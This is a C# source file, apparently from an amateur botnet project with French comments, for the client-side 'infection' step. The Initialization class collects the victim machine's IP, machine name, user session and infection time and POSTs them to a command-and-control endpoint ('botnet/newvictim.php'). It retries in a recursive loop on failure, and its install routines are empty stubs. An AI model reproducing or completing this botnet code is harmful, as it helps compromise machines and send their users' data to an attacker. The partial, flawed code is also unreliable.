using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Collections.Specialized;
using System.Threading;

namespace Botnet
{
    //Cette classe contiendra tout ce qu'il faut faut serveur au moment de l'infection: installation, envoie de données au C&C
    class Initialization
    {
        private static readonly HttpClient client = new HttpClient();

        public Initialization()
        {

        }

        public bool IsAlreadyInstalled()
        {

            return false;
        }

        public void Install()
        {
            //Générer un machine ID
        }

        //Raph: à mon avis la méthode est très bancale, je ne penses que c'est comme ça qu'il faut utiliser uen fonction asynchrone
        public async Task sendInfoToCNCAsync()
        {
            try
            {
                Tools info = new Tools();
                var values = new Dictionary<string, string>
                {
                   {"ip", info.ip },
                   {"port" , "2107" },
                   { "os" , "asyncTEST" },
                   { "machine_name" , info.machine_name },
                   { "user_session" , info.user_session },
                   { "infection_date" , DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") }, //format UTC 0 
                };

                var content = new FormUrlEncodedContent(values);

                //await signifie l'obligation d'attendre l'execution complète de l'instruction suivante
                var response = await client.PostAsync("http://127.0.0.1/botnet/newvictim.php", content);

                var responseString = await response.Content.ReadAsStringAsync();
                Console.WriteLine(responseString);
               
            }
            catch(Exception e)
            {
                Console.WriteLine("Exeption levée dans Initialization.sendInfoToCNCAsync(): " + e.Message + "\nSeconde tentative dans 10000 milisecondes (10 secondes)");
                Console.WriteLine(e.Message);
                Thread.Sleep(10000);
                sendInfoToCNCAsync();
            }
        }
    }
}
